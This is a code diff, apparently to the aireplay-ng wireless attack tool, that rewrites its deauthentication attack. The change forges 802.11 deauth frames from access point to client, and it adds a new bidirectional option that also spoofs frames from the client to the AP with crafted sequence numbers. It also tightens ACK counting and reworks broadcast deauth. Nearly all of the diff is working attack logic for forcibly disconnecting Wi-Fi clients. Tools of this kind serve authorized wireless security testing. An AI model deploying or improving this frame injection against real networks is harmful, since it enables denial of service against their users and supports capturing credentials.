@@ -409,6 +409,7 @@ static int do_attack_deauth(void)
 {
 	int i, n;
 	int aacks, sacks, caplen;
+	static uint16_t seq_sta = 0;
 	struct timeval tv;
 	fd_set rfds;
 
@@ -438,57 +439,60 @@ static int do_attack_deauth(void)
 
 		if (memcmp(opt.r_dmac, NULL_MAC, 6) != 0)
 		{
-			/* deauthenticate the target */
-
-			memcpy(h80211, DEAUTH_REQ, 26);
-			memcpy(h80211 + 16, opt.r_bssid, 6);
-
-			/* add the deauth reason code */
-			h80211[24] = opt.deauth_rc;
-
 			aacks = 0;
 			sacks = 0;
-			/*if (i == 0)
+
+			// --- Frame 1: AP → Client ---
+			memcpy(h80211, DEAUTH_REQ, 26);
+			h80211[0] = 0xC0; // Type/Subtype: Deauth, ToDS=0, FromDS=0
+			h80211[1] = 0x00;
+
+			memcpy(h80211 + 4, opt.r_dmac, 6);   // Addr1 = Client
+			memcpy(h80211 + 10, opt.r_bssid, 6); // Addr2 = AP
+			memcpy(h80211 + 16, opt.r_bssid, 6); // Addr3 = AP
+
+			h80211[24] = opt.deauth_rc;
+
+			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)
+				return (EXIT_FAILURE);
+
+			usleep(2000);
+
+			// --- Frame 2: Client → AP (if bidirectional) ---
+			if (opt.bidirectional)
 			{
-				PCT;
-				printf("Sending directed DeAuth (code %i). STMAC:"
-					   " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
-					   opt.deauth_rc,
-					   opt.r_dmac[0],
-					   opt.r_dmac[1],
-					   opt.r_dmac[2],
-					   opt.r_dmac[3],
-					   opt.r_dmac[4],
-					   opt.r_dmac[5],
-					   sacks,
-					   aacks);
+				memcpy(h80211, DEAUTH_REQ, 26);
+				h80211[0] = 0xC0;
+				h80211[1] = 0x00;
+
+				memcpy(h80211 + 4, opt.r_bssid, 6); // Addr1 = AP
+				memcpy(h80211 + 10, opt.r_dmac, 6); // Addr2 = Client
+				memcpy(h80211 + 16, opt.r_bssid, 6); // Addr3 = AP
+
+				h80211[22] = (uint8_t)((seq_sta & 0x000F) << 4);
+				h80211[23] = (uint8_t)((seq_sta & 0x0FF0) >> 4);
+
+				h80211[24] = opt.deauth_rc;
+
+				if (send_packet(_wi_out, h80211, 26, kNoChange) < 0)
+					return (EXIT_FAILURE);
+
+				seq_sta++;
+
+				usleep(2000);
 			}
 
-			memcpy(h80211 + 4, opt.r_dmac, 6);
-			memcpy(h80211 + 10, opt.r_bssid, 6);
+			// --- ACK Sniffing (shared for both frames) ---
+			int ack_loops = 0;
+			const int max_ack_loops = 50; // Tune this up/down as needed
 
-			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber)
-				< 0)
-				return (EXIT_FAILURE);
-
-			usleep(2000);
-			*/
-
-			memcpy(h80211 + 4, opt.r_bssid, 6);
-			memcpy(h80211 + 10, opt.r_dmac, 6);
-			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber)
-				< 0)
-				return (EXIT_FAILURE);
-
-			usleep(2000);
-
-			while (1)
+			while (ack_loops++ < max_ack_loops)
 			{
 				FD_ZERO(&rfds);
 				FD_SET(dev.fd_in, &rfds);
 
 				tv.tv_sec = 0;
-				tv.tv_usec = 1000;
+				tv.tv_usec = 5000;
 
 				if (select(dev.fd_in + 1, &rfds, NULL, NULL, &tv) < 0)
 				{
@@ -502,57 +506,56 @@ static int do_attack_deauth(void)
 				caplen = read_packet(_wi_in, tmpbuf, sizeof(tmpbuf), NULL);
 
 				if (caplen <= 0) break;
-				if (caplen != 10) continue;
-				if (tmpbuf[0] == 0xD4)
+				if (tmpbuf[0] == 0xD4) // ACK frame
 				{
-					if (memcmp(tmpbuf + 4, opt.r_dmac, 6) == 0)
-					{
-						aacks++;
-					}
-					if (memcmp(tmpbuf + 4, opt.r_bssid, 6) == 0)
-					{
-						sacks++;
-					}
-					PCT;
-					printf(
-						"Sending directed DeAuth (code %i). STMAC:"
-						" [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
-						opt.deauth_rc,
-						opt.r_dmac[0],
-						opt.r_dmac[1],
-						opt.r_dmac[2],
-						opt.r_dmac[3],
-						opt.r_dmac[4],
-						opt.r_dmac[5],
-						sacks,
-						aacks);
+					// Addr1 is at offset 4
+					if (memcmp(tmpbuf + 4, opt.r_dmac, 6) == 0) aacks++;
+					if (memcmp(tmpbuf + 4, opt.r_bssid, 6) == 0) sacks++;
 				}
 			}
-			printf("\n");
+
+			PCT;
+			if (aacks || sacks)
+			{
+				printf("Sent DeAuth (code %i). STMAC: "
+					   "[%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]%s\n",
+					   opt.deauth_rc,
+					   opt.r_dmac[0], opt.r_dmac[1], opt.r_dmac[2],
+					   opt.r_dmac[3], opt.r_dmac[4], opt.r_dmac[5],
+					   sacks, aacks,
+					   opt.bidirectional ? " (bidirectional)" : "");
+			}
+			else
+			{
+				printf("Sent DeAuth (code %i). STMAC: "
+					   "[%02X:%02X:%02X:%02X:%02X:%02X] [No ACKs]%s\n",
+					   opt.deauth_rc,
+					   opt.r_dmac[0], opt.r_dmac[1], opt.r_dmac[2],
+					   opt.r_dmac[3], opt.r_dmac[4], opt.r_dmac[5],
+					   opt.bidirectional ? " (bidirectional)" : "");
+			}
 		}
 		else
 		{
-			/* deauthenticate all stations */
-
+			// Broadcast deauth (no STA provided)
 			PCT;
 			printf("Sending DeAuth (code %i) to broadcast -- BSSID:"
 				   " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
 				   opt.deauth_rc,
-				   opt.r_bssid[0],
-				   opt.r_bssid[1],
-				   opt.r_bssid[2],
-				   opt.r_bssid[3],
-				   opt.r_bssid[4],
-				   opt.r_bssid[5]);
+				   opt.r_bssid[0], opt.r_bssid[1], opt.r_bssid[2],
+				   opt.r_bssid[3], opt.r_bssid[4], opt.r_bssid[5]);
 
 			memcpy(h80211, DEAUTH_REQ, 26);
-			h80211[24] = opt.deauth_rc;
+			h80211[0] = 0xC0;
+			h80211[1] = 0x00;
 
 			memcpy(h80211 + 4, BROADCAST, 6);
 			memcpy(h80211 + 10, opt.r_bssid, 6);
 			memcpy(h80211 + 16, opt.r_bssid, 6);
-			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber)
-				< 0)
+
+			h80211[24] = opt.deauth_rc;
+
+			if (send_packet(_wi_out, h80211, 26, kRewriteSequenceNumber) < 0)
 				return (1);
 
 			usleep(2000);
@@ -561,6 +564,7 @@ static int do_attack_deauth(void)
 
 	return (EXIT_SUCCESS);
 }
+
 
 static int do_attack_fake_auth(void)
 {
@@ -6378,6 +6382,7 @@ int main(int argc, char * argv[])
 	opt.f_retry = 0;
 	opt.reassoc = 0;
 	opt.deauth_rc = 1; /* By default deauth reason code is Unspecified Failure */
+	opt.bidirectional = 0;
 
 /* XXX */
 #if 0
@@ -6416,12 +6421,13 @@ int main(int argc, char * argv[])
 			   {"ignore-negative-one", 0, &opt.ignore_negative_one, 1},
 			   {"deauth-rc", 1, 0, 'Z'},
 			   {"test", 0, 0, '9'},
+			   {"bidirectional", 0, 0, 'Y'},
 			   {0, 0, 0, 0}};
 
 		int option = getopt_long(argc,
 								 argv,
 								 "b:d:s:m:n:u:v:t:Z:T:f:g:w:x:p:a:c:h:e:ji:r:k:"
-								 "l:y:o:q:Q0:1:2345678P:9HFBDR",
+								 "l:y:o:q:Q0:1:2345678P:Y9HFBDR",
 								 long_options,
 								 &option_index);
 
@@ -6884,7 +6890,10 @@ int main(int argc, char * argv[])
 					return (1);
 				}
 				break;
-
+			
+			case 'Y':
+				opt.bidirectional = 1;
+				break;
 			
 			case 'F':
 
